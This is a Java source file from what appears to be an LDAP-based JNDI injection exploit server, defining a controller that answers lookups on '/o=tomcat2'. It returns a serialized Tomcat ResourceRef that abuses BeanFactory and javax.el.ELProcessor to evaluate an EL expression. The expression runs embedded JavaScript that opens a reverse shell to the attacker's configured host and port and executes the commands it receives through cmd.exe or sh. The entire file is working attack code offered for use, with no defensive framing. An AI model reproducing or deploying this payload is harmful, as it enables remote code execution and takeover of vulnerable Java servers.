package artsploit.controllers;

import artsploit.Config;
import artsploit.annotations.LdapMapping;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

import static artsploit.Utilities.makeJavaScriptString;
import static artsploit.Utilities.serialize;

@LdapMapping(uri = { "/o=tomcat2" })
public class Tomcat2 implements LdapController {
    String host = Config.lhost;
    String port = Config.lport;
    String cmd = "var Socket = Java.type(\"java.net.Socket\");" +
        "var isWin = java.lang.System.getProperty(\"os.name\").toLowerCase().contains(\"win\");" +
        "var InputStreamReader = Java.type(\"java.io.InputStreamReader\");" +
        "var BufferedReader = Java.type(\"java.io.BufferedReader\");" +
        "var PrintWriter = Java.type(\"java.io.PrintWriter\");" +
        "var ProcessBuilder = Java.type(\"java.lang.ProcessBuilder\");" +
        "var socket = new Socket(\"" + host + "\", " + port + ");" +
        "var out = new PrintWriter(socket.getOutputStream(), true);" +
        "var inReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));" +
        "out.println(\"Hello from the other side!\");" +
        "while (true) {" +
        "   var cmd = inReader.readLine();" +
        "   cmd = cmd == null ? \"whoami\":cmd;" +
        "   if (cmd.trim() === \"exit\") {" +
        "       break;" +
        "   }" +
        "   var p = new java.lang.ProcessBuilder();" +
        "   if(isWin){" +
        "       p.command(\"cmd.exe\", \"/c\", cmd);" +
        "   }else{" +
        "       p.command(\"sh\", \"-c\", cmd);" +
        "   }" +
        "   p.redirectErrorStream(true);" +
        "   var process = p.start();" +
        "   var commandOutputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));" +
        "   var commandOutput = \"\";" +
        "   var line = commandOutputReader.readLine();" +
        "   while (line != null) {" +
        "      commandOutput += line + java.lang.System.lineSeparator();" +
        "       line = commandOutputReader.readLine();" +
        "   }" +
        "   out.println(commandOutput);" +
        "   commandOutputReader.close();" +
        "}" +
        "inReader.close();" +
        "out.close();" +
        "socket.close();";
  
    String payload = ("{" +
            "''.getClass().forName('javax.script.ScriptEngineManager')" +
            ".newInstance().getEngineByName('JavaScript')" +
            ".eval('${command}')".replace("${command}", cmd) +
            "}");
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {

        System.out.println("Sending LDAP ResourceRef result for " + base + " with javax.el.ELProcessor payload");

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any

        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
//        System.out.println(payload);
        ref.add(new StringRefAddr("x", payload));
        e.addAttribute("javaSerializedData", serialize(ref));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}
